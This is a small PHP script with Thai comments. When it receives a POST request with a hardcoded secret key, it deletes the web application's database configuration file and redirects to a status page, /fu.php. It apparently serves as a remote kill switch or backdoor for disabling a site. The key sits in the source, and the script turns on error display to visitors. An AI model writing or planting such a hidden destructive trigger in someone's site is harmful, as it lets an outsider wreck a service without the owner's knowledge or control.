<?php
// เปิดการแสดงข้อผิดพลาดเพื่อการดีบัก
error_reporting(E_ALL);
ini_set('display_errors', 1);

// คีย์ที่ใช้ในการยืนยันการลบไฟล์
$secret_key = 'mewart20-11-67-auto'; // คีย์ที่คุณต้องการใช้

// ตรวจสอบคำขอ POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // รับคีย์จาก POST
    $input_key = $_POST['key'];

    // ตรวจสอบคีย์ที่ส่งมาว่าตรงกับคีย์ที่ตั้งไว้หรือไม่
    if ($input_key === $secret_key) {
        // พาธของไฟล์ที่ต้องการลบ
        $file_path = $_SERVER['DOCUMENT_ROOT'] . '/application/config/database.php'; // พาธที่ไฟล์อยู่จริงในเซิร์ฟเวอร์

        // ตรวจสอบว่าไฟล์นั้นมีอยู่หรือไม่
        if (file_exists($file_path)) {
            // ลบไฟล์
            if (unlink($file_path)) {
                // ถ้าลบไฟล์สำเร็จ, ส่งสถานะกลับไปยังหน้า fu.php
                header('Location: /fu.php?status=success');
                exit;
            } else {
                // ถ้าไม่สามารถลบไฟล์ได้, ส่งสถานะผิดพลาด
                header('Location: /fu.php?status=failure');
                exit;
            }
        } else {
            // ถ้าไม่พบไฟล์ที่ต้องการลบ, ส่งสถานะผิดพลาด
            header('Location: /fu.php?status=failure');
            exit;
        }
    } else {
        // ถ้าคีย์ไม่ถูกต้อง, ส่งสถานะผิดพลาด
        header('Location: /fu.php?status=key_error');
        exit;
    }
} else {
    echo "โปรดส่งคำขอ POST";
}
?>
